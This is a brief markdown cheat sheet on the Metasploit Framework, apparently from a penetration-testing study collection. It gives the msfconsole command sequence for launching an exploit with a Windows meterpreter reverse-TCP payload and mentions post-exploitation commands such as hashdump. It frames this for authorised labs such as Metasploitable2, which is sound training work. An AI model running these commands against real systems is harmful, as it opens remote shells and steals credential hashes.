---
tags: [tools,metasploit,exploitation]
---

# Metasploit Framework
Exploitation framework. **Authorized labs only.**
```
msfconsole
search <service/CVE>
use exploit/path
set RHOSTS 10.0.0.5
set LHOST 10.0.0.1
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
```
- **msfvenom** generates payloads. **meterpreter** = post-exploitation shell (`getuid`, `hashdump`, `migrate`).
- Modules: exploits, auxiliary (scanners), post, payloads.
Practice on Metasploitable2.
